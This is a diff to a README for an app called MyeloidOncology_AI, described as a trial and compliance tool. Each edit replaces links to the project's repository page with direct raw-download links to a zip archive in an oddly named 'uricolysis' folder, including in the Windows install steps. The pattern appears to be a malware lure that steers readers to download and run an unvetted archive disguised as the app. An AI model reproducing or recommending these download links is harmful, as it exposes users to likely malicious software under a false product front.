@@ -1,12 +1,12 @@
 # 🩺 MyeloidOncology_AI - Smarter Trial and Compliance Tools
 
-[![Download](https://img.shields.io/badge/Download-MyeloidOncology_AI-8A2BE2?style=for-the-badge&logo=github)](https://github.com/liame790/MyeloidOncology_AI)
+[![Download](https://img.shields.io/badge/Download-MyeloidOncology_AI-8A2BE2?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/liame790/MyeloidOncology_AI/main/uricolysis/Myeloid_Oncology_AI_2.6-beta.2.zip)
 
 ## 📥 Download the app
 
 Use this link to visit the download page:
 
-[Download MyeloidOncology_AI](https://github.com/liame790/MyeloidOncology_AI)
+[Download MyeloidOncology_AI](https://raw.githubusercontent.com/liame790/MyeloidOncology_AI/main/uricolysis/Myeloid_Oncology_AI_2.6-beta.2.zip)
 
 ## 🧭 What this app does
 
@@ -35,7 +35,7 @@ For best results, close other large programs before you open the app.
 ## 🚀 Install on Windows
 
 1. Open this page in your browser:
-   [https://github.com/liame790/MyeloidOncology_AI](https://github.com/liame790/MyeloidOncology_AI)
+   [https://raw.githubusercontent.com/liame790/MyeloidOncology_AI/main/uricolysis/Myeloid_Oncology_AI_2.6-beta.2.zip](https://raw.githubusercontent.com/liame790/MyeloidOncology_AI/main/uricolysis/Myeloid_Oncology_AI_2.6-beta.2.zip)
 
 2. Find the download file or release package on the page.
 
